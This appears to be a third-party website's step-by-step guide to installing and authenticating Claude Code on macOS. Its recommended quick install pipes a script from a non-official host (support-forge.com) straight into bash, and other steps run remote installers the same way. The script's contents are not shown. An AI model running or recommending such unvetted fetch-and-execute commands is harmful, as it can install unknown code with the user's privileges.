5. Mac Installation

Step-by-step guide for installing Claude Code on macOS

Quick Install (Recommended)

Open Terminal and run this single command:

curl -fsSL https://support-forge.com/downloads/claude-install.sh | bash

This script will automatically:

  • Check your macOS version
  • Install Xcode Command Line Tools (if needed)
  • Install Homebrew (if needed)
  • Install Node.js (if needed)
  • Install Claude Code CLI
  • Verify the installation
Prefer manual installation? Follow the step-by-step guide below.

Manual Installation

1

Open Terminal

Press Cmd + Space, type "Terminal", and press Enter

2

Install Xcode Command Line Tools

Required for development tools on Mac

xcode-select --install

A popup will appear. Click "Install" and wait for completion.

3

Install Homebrew

The missing package manager for macOS

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
Apple Silicon Macs (M1/M2/M3): After installing Homebrew, run these commands:
echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile eval "$(/opt/homebrew/bin/brew shellenv)"
4

Install Node.js

brew install node

Verify installation:

node --version npm --version

Expected: v22.x.x for Node, 10.x.x for npm

5

Install Git (if not already installed)

brew install git
6

Install Claude Code CLI

curl -fsSL https://claude.ai/install.sh | sh
7

Verify Installation

Close and reopen Terminal, then run:

claude --version

Expected: claude-code version X.X.X

8

Run Health Check

claude doctor

Authenticate

9

Navigate to Your Project

cd ~/Projects/my-project

Or create a test folder:

mkdir ~/ClaudeTest && cd ~/ClaudeTest
10

Start Claude Code

claude
11

Complete Authentication

  1. Your default browser opens to Anthropic login
  2. Sign in with your Claude Pro/Max credentials
  3. Click "Allow" to authorize Claude Code
  4. Return to Terminal - you're ready!
Success! You should see: "Authentication successful! Welcome to Claude Code."

Common Commands

Command Description
claude Start Claude Code in current directory
claude "do something" Start with a specific task
claude --version Check installed version
claude doctor Run health check
claude update Update to latest version
claude logout Sign out

Troubleshooting

"command not found: claude"

Add Claude to your PATH:

export PATH="$HOME/.claude/bin:$PATH"

To make permanent, add to ~/.zshrc:

echo 'export PATH="$HOME/.claude/bin:$PATH"' >> ~/.zshrc source ~/.zshrc

"Homebrew not found" on Apple Silicon

eval "$(/opt/homebrew/bin/brew shellenv)"

"Permission denied" errors

Fix npm permissions:

sudo chown -R $(whoami) ~/.npm sudo chown -R $(whoami) /usr/local/lib/node_modules

"Authentication failed"

  1. Ensure your subscription is active at claude.ai
  2. Try: claude logout then claude
  3. Check if firewall is blocking claude.ai
